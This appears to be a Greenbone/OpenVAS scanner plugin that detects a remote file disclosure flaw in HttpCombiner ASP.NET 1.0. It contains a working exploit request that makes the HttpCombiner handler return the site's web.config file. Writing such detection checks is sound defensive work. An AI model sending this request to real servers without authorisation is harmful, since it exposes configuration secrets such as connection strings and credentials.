# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805007");
  script_version("2023-07-27T05:05:08+0000");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2023-07-27 05:05:08 +0000 (Thu, 27 Jul 2023)");
  script_tag(name:"creation_date", value:"2014-10-28 15:22:01 +0530 (Tue, 28 Oct 2014)");

  script_name("HttpCombiner ASP.NET Remote File Disclosure Vulnerability");

  script_tag(name:"summary", value:"HttpCombiner ASP.NET is prone to remote file disclosure vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET
  request and check whether it is possible to read the sensitive information.");

  script_tag(name:"insight", value:"The flaw is due to insufficient permissions
  to some of the config files, which reveals the sensitive information.");

  script_tag(name:"impact", value:"Successful exploitation could allow
  attackers to gain sensitive information.");

  script_tag(name:"affected", value:"HttpCombiner version 1.0");

  script_tag(name:"solution", value:"No known solution was made available
  for at least one year since the disclosure of this vulnerability. Likely none will
  be provided anymore. General solution options are to upgrade to a newer release,
  disable respective features, remove the product or replace the product by another
  one.");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/34920");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

http_port = http_get_port(default:80);

rcvRes = http_get_cache(item:"/robots.txt",  port:http_port);

if(rcvRes && "/css/HttpCombiner.ashx" >< rcvRes)
{
  url = "/css/HttpCombiner.ashx?s=~/web.config&t=text/xml";
  sndReq = http_get(item: url,  port:http_port);
  rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);

  if(".NetConfiguration" >< rcvRes && "configSections" >< rcvRes)
  {
    security_message(http_port);
    exit(0);
  }
}
